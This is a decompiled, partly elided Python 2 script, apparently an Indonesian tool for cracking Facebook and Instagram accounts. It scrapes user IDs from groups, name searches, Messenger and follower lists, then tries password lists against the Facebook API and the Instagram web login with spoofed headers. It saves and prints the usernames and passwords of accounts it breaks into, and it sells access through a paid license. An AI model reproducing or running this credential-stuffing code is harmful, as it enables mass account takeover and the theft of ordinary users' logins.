# Decompiled by dr4xen with Decompyle++
...
til = '\xe2\x80\xa2'
(ok, cp, id, user, mi, status_foll, poll, cr, c, loop) = ([], [], [], [], [], [], [], [], 1, 0)
...
def konfir():
    ...
    try:
        ...
        os.system('clear')
        print '%s\xe2\x80\xa2 Lisensi kadaluarsa' % M
        jeda(2)
...
def banner():
    print ' %s%s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n     %s    %s %sCoded by %s: %s%s %s%s   \n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sGit%s  : %s%s \n %s# %s---------------------------------------- %s#  ' % (M, til, K, til, H, til, M, til, K, til, H, til, M, P, U, til, K, M, K, author, U, til, M, til, K, til, H, til, M, til, K, til, H, til, U, O, M, O, fb_me, U, O, M, O, github, P, M, P)
...
def masuk():
    ...
    if rom in ('3', '03'):
        print '\n%s%s Berikut cara nya :' % (H, til)
        jeda(2)
        print ' - siapkan akun facebook (wajib akun tumbal)'
        jeda(2)
...
def _romiXD_(show = True):
    ...
    try:
        ...
        if kueh(cks) == True:
            ...
            exit('%s%s login success, ketik: python2 bff-2.py ' % (H, til))
        else:
            print '%s%s login gagal.' % (M, til)
            _romiXD_(show = True)
    except Exception:
        e = None
        print '%s%s error : %s\n' % (M, til, e)
    ...
    with requests.Session() as ses:
        ...
        try:
            otw = ses.get(url, cookies = {
                'cookie': romz }, headers = headerz_api)
            if 'users' in json.loads(otw.content):
                cookie = {
                    'cookie': romz }
            else:
                print '\n%s%s Cookie invalid ' % (M, til)
                jeda(2)
...
def masuk_ig():
    global cookie
    print '\n%s\xe2\x80\xa2%s Login dengan akun instagram anda ' % (U, O)
    ...
    try:
        ...
        try:
            ...
            param = {
                'username': userrr,
                'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(random.randint(1000000000, ), peweh),
                'optIntoOneTap': False,
                'queryParams': { },
                'stopDeletionNonce': '',
        ...
        with requests.Session() as ses:
            ...
            if 'userId' in str(data):
                print '\n%s%s Login succes, run kan lagi scriptnya ' % (H, til)
                jeda(2)
                exit()
                for bff in _2:
                ...
                print '\n%s%s Akun terkena sesi ' % (M, til)
                jeda(2)
            elif 'Please wait' in str(data):
                print '\n%s%s Mode pesawat 3 detik ' % (M, til)
                jeda(2)
            else:
                print '\n%s%s Login gagal, silahkan coba lagi ' % (M, til)
                jeda(2)
                exit()
...
class group:
    ...
    def dumps(self, url):
        ...
        print '%s%s%s File dump tersimpan %s>%s %s ' % (U, til, O, M, H, self.fl)
        raw_input('\n%s%s%s [%s Enter%s ] ' % (U, til, O, U, O))
        menu()
...
def dumpfl():
    ...
    if len(bs4.re.findall('logout', r)) != 0:
        ...
        if s in ('romi', 'Romi', 'ROMI', 'Romi Afrizal', 'Romi afrizal', 'ROMI AFRIZAL', 'romi afrizal'):
            print '\n%s%s anak anjing mau crack pake nama gw ' % (M, til)
            exit()
        elif s in ('Romi Ganteng', 'Romi ganteng', 'ROMI GANTENG', 'romi ganteng'):
            print '\n%s%s memang ganteng dong abang Romi' % (H, til)
            exit()
...
def namah(sim, r, b):
    ...
    for i in b.find_all('a', href = True):
        print '\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu' % (U, til, O, M, H, str(len(open(sim).read().splitlines()))),
        sys.stdout.flush()
        if '<img alt=' in str(i):
        ...
        if 'Lihat Hasil Selanjutnya' in i.text:
            namah(sim, r, i['href'])
            continue
    print '\n\n%s%s Succes dump id pencarian nama ' % (H, til)
    print '%s%s%s File dump tersimpan %s>%s %s ' % (U, til, O, M, H, sim)
    raw_input('\n%s%s%s [%s Enter%s ] ' % (U, til, O, U, O))
    menu()
...
class pesan:
    ...
    def dump(self, url):
        ...
        print '\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\r' % (U, til, O, M, H, str(len(open(self.f).read().splitlines())))
        sys.stdout.flush()
        jeda(0.005)
    ...
    with requests.Session() as ses:
        ...
        for _j_ in json.loads(otw.content)['users']:
            ...
            if len(status_foll) != 1:
                print '\r%s\xe2\x80\xa2%s Total user%s > %s%s' % (U, O, M, K, len(mi)),
                sys.stdout.flush()
...
class ngentod:
    ...
    def b_api(self, user, manual):
        ...
        for pw in manual:
            ...
            header = {
                'user-agent': ua,
                'x-fb-connection-bandwidth': str(random.randin(2e+07, 3e+07)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
...
def menu():
    ...
    try:
        romz_ = open('data/token.txt', 'r').read()
    except IOError:
        print '%s%s Token invalid ' % (M, til)
        jeda(2)
    ...
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + romz_, headers = header)
        a = json.loads(r.text)
        nama = a['name']
    except KeyError:
        print '%s%s Token invalid ' % (M, til)
    ...
    print '%s\xe2\x80\xa2%s 04 %sDump id anggota groups' % (U, P, O)
    print '%s\xe2\x80\xa2%s 05 %sDump id pencarian nama' % (U, P, O)
    print '%s\xe2\x80\xa2%s 06 %sDump id pesan mesengger' % (U, P, O)
    print '%s\xe2\x80\xa2%s 07 %sCrack facebook' % (U, P, H)
    print '%s\xe2\x80\xa2%s 08 %sCrack instagram' % (U, P, H)
    print '%s\xe2\x80\xa2%s 09 %sSetting user agent' % (U, P, O)
    print '%s\xe2\x80\xa2%s 10 %sCek hasil crack' % (U, P, O)
    print '%s\xe2\x80\xa2%s 11 %sCek opsi akun' % (U, P, O)
    print '%s\xe2\x80\xa2%s rm %sHapus akun' % (U, P, O)
    print '%s\xe2\x80\xa2%s 00 %sKeluar' % (U, M, O)
    slut = raw_input('\n%s# %sPilih %s> %s' % (P, O, M, K))
    if slut == '':
        print '\n%s%s isi yang benar' % (M, til)
        jeda(2)
...
def menu_igeh():
    print '\n%s\xe2\x80\xa2%s 01 %sCrack followers public' % (U, P, O)
    print '%s\xe2\x80\xa2%s 02 %sCrack pencarian nama' % (U, P, O)
    print '%s\xe2\x80\xa2%s 03 %sCek hasil crack' % (U, P, O)
    print '%s\xe2\x80\xa2%s rm %sHapus akun ' % (U, P, O)
    print '%s\xe2\x80\xa2%s 00 %sKembali' % (U, M, O)
    romz_ = raw_input('\n%s# %sPilih %s> %s' % (P, O, M, K))
    if romz_ in ('',):
        print '\n%s%s isi yang benar' % (M, til)
        jeda(2)
        ...
        print ' %s# %s---------------------------------------- %s#' % (P, M, P)
        jeda(2)
        print '%s\xe2\x80\xa2%s 01%s Pengikut %s> %s%s' % (U, P, O, M, K, str(pengikut))
        print '%s\xe2\x80\xa2%s 02%s Mengikuti %s> %s%s' % (U, P, O, M, K, str(mengikuti))
        rm = raw_input('\n%s# %sPilih %s> %s' % (P, O, M, K))
        ...
        kel = raw_input('\x1b[1;95m\xe2\x80\xa2\x1b[1;96m ingin menghapus akun instagram? y/n : ')
        if kel in ('y', 'Y'):
            print ''
            s = [
                '.   ',
                ...
                '... ']
            for m in s:
                print '\r\x1b[1;95m\xe2\x80\xa2\x1b[1;96m menghapus akun ' + m,
                sys.stdout.flush()
                jeda(1)
            ...
            print '\n%s%s%s jalankan ulang tools nya' % (M, til, O)
            jeda(2)
    elif romz_ in ('0', '00'):
        menu()
    else:
    ...
    while True:
        ...
        if rom in ('1', '01'):
            ...
            try:
                ...
                print ' %s# %s---------------------------------------- %s#%s' % (P, M, P, K)
                jeda(2)
                print '%s\xe2\x80\xa2 %sJumlah %s: %s%s' % (U, O, M, H, str(len(oke)))
                print ' %s# %s---------------------------------------- %s#%s' % (P, M, P, H)
                jeda(2)
                okek = open('okeh.txt', 'r').read()
                print okek
                exit(' %s# %s---------------------------------------- %s#%s' % (P, M, P, K))
                jeda(2)
            except IOError:
                KeyError = None
        ...
        if rom in ('2', '02'):
            ...
            try:
                ...
                print ' %s# %s---------------------------------------- %s#%s' % (P, M, P, K)
                jeda(2)
                print '%s\xe2\x80\xa2 %sJumlah %s: %s%s' % (U, O, M, K, str(len(cepe)))
                print ' %s# %s---------------------------------------- %s#%s' % (P, M, P, K)
                jeda(2)
...
def konfirmasi():
    ...
    jeda(1)
    jalan('%s\xe2\x80\xa2 %sLisensi Belum Di konfirmasi' % (U, O))
    su = raw_input('\n%s\xe2\x80\xa2%s ingin beli lisensi? y/t %s: %s' % (U, O, M, K))
    if su in ('',):
        exit()
    elif su in ('y', 'Y'):
        os.system('am start https://wa.me/+628811403654?text=Assalamualaikum+saya+ingin+beli+lisensi:+' + id + '>/dev/null')
        jeda(1)
        exit()
    elif su in ('t', 'T'):
        exit()
...
def konfirmasi1():
    ...
    try:
        lis = open('data/lisensi.txt', 'r').read()
        git = requests.get('https://github.com/Crack26/MBF/blob/main/license.txt').text.strip()
        if lis in git:
            os.system('clear')
            banner()
            print '\n'
            s = [
                ...
                '... ']
            for m in s:
                print '\r\x1b[1;95m\xe2\x80\xa2\x1b[1;96m Memeriksa lisensi ' + m,
                sys.stdout.flush()
                jeda(1)
            
            jalan('\n%s\xe2\x80\xa2 Lisensi tersedia \xe2\x88\x9a' % H)
            jeda(1)
            menu()
        else:
            os.system('clear')
            ...
            jalan('\n%s\xe2\x80\xa2 Lisensi tidak tersedia' % M)
            jeda(1)
            konfirmasi()
    except IOError:
        os.system('rm -rf data/lisensi.txt')
...
def proses():
    print '\n%s%s%s akun %s[OK] %stersimpan ke file %s> %s%s' % (U, til, O, H, O, M, H, 'okeh.txt')
    jeda(0.2)
    print '%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %s%s' % (U, til, O, M, K, M, O, M, K, 'cepeh.txt')
    jeda(0.2)
    print '%s!%s crack berjalan, tekan CTRL+Z untuk berhenti\n' % (U, O)
    jeda(0.2)
...
def crack2(user, pwx):
    global c, count_, c, count_, c, count_
    c_bff_ = len(pwx)
    for pas in pwx:
        if c != 1:
            pass
        if len(status_foll) != 1:
            print '\r \x1b[1;96m*--> %s/%s [OK:%s]-[CP:%s] ' % (str(count_), len(mi), len(ok), len(cp)),
            sys.stdout.flush()
            c_bff_ -= 1
        ...
        try:
            ...
            try:
                ...
                with requests.Session() as ses:
                    ...
                    c_toket = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
                header = {
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.5',
                ...
                param = {
                    'username': user,
                    'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(random.randint(1000000000, ), pw),
                    'optIntoOneTap': False,
                    'queryParams': { },
                    'stopDeletionNonce': '',
                    'trustedDeviceRecords': { } }
...
def ingfo(user, pw, status):
    ...
    try:
        ...
        if status == 'Berhasil':
            print '\r%s [\xe2\x88\x9a] Berhasil                   ' % H
            print '\r%s [\xe2\x88\x9a] Nama akun %s> %s%s          ' % (H, M, H, str(nama))
            print '\r%s [\xe2\x88\x9a] Pengikut  %s> %s%s          ' % (H, M, H, str(pengikut))
            print '\r%s [\xe2\x88\x9a] Mengikuti %s> %s%s          ' % (H, M, H, str(mengikuti))
            print '\r%s [\xe2\x88\x9a] Username  %s> %s%s          ' % (H, M, H, user)
            print '\r%s [\xe2\x88\x9a] Password  %s> %s%s          \n' % (H, M, H, pw)
        elif status == 'Checkpoint':
            print '\r%s [\xc3\x97] Checkpoint                 ' % K
            print '\r%s [\xc3\x97] Nama akun %s> %s%s          ' % (K, M, K, str(nama))
            print '\r%s [\xc3\x97] Pengikut  %s> %s%s          ' % (K, M, K, str(pengikut))
            print '\r%s [\xc3\x97] Mengikuti %s> %s%s         ' % (K, M, K, str(mengikuti))
            print '\r%s [\xc3\x97] Username  %s> %s%s         ' % (K, M, K, user)
            print '\r%s [\xc3\x97] Password  %s> %s%s          \n' % (K, M, K, pw)
    except:
        pass
